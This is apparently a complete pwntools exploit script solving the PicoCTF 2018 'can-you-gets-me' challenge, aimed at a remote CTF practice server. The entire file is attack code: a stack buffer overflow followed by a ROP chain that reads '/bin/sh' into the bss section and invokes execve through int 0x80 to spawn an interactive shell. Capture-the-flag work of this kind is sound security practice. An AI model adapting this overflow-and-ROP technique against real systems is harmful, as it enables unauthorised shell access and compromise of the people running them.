from pwn import *


# p = process("./PicoCTF_2018_can-you-gets-me")
p = remote("node4.buuoj.cn", 29011)
pro = ELF("./PicoCTF_2018_can-you-gets-me")


read_func = pro.sym["read"]
pop_edx_ecx_ebx_ret = 0x0806f050
pop_eax_ret = 0x080b81c6
int_0x80 = 0x0806cc25 
bss_addr = 0x080EAF80


# rop chain
pad = cyclic(0x18+0x4)
pad += p32(read_func)+p32(pop_edx_ecx_ebx_ret)
pad += p32(0)+p32(bss_addr)+p32(0x8)+p32(pop_edx_ecx_ebx_ret)
pad += p32(0)+p32(0)+p32(bss_addr)
pad += p32(pop_eax_ret)+p32(0xb)
pad += p32(int_0x80)
p.sendline(pad)
p.send("/bin/sh\x00")

p.interactive()


